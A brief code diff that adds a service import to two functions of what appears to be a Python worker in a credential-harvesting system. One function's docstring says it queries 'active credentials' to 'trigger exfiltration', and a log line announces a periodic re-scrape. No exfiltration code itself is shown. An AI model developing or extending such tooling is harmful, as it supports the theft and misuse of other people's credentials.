@@ -469,6 +469,7 @@ def system_heartbeat():
         asyncio.set_event_loop(loop)
     
     msg = "💓 **System Heartbeat**: Worker is active and scanning."
+    from app.services.broadcaster_srv import broadcaster_service
     loop.run_until_complete(broadcaster_service.send_log(msg))
     return "Heartbeat sent."
 
@@ -488,6 +489,7 @@ async def _rescrape_active_logic():
     """
     Query all active credentials with a chat_id and trigger exfiltration.
     """
+    from app.services.broadcaster_srv import broadcaster_service
     await broadcaster_service.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
     
     try:
